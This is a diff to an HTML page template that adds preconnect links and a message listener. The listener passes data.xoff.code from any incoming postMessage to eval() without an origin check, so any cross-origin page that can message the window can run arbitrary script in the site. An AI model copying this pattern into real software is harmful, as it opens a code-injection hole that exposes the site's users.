@@ -31,6 +31,12 @@
 		<meta name="theme-color" content="#543d46">
 		<!-- OT⋄CUSTOM END favicons -->
 
+		<!-- OT⋄CUSTOM BEGIN links -->
+		<link rel="preconnect" href="https://www.googletagmanager.com">
+		<link rel="preconnect" href="https://identity.netlify.com">
+		<link rel="preconnect" href="https://tlk.io">
+		<!-- OT⋄CUSTOM END links -->
+
 		<style type="text/css">
 			:root {
 				--bg: black;
@@ -384,8 +390,16 @@
 		/////////////////////
 	</script>
 
-	<!-- OT⋄CUSTOM BEGIN low priority scripts -->
-	<!-- OT⋄CUSTOM END low priority scripts -->
+	<!-- OT⋄CUSTOM BEGIN low priority scripts & misc -->
+	<script>
+		window.addEventListener('message', ({data, origin, source}) => {
+			console.log('⬆️ received', { data, origin, source })
+			if (data?.xoff?.code)
+				eval(data?.xoff?.code) // yeah baby!
+		}, false);
+	</script>
+
+	<!-- OT⋄CUSTOM END low priority scripts & misc -->
 
 	<script type="module">
 		// TODO progressive enhancements
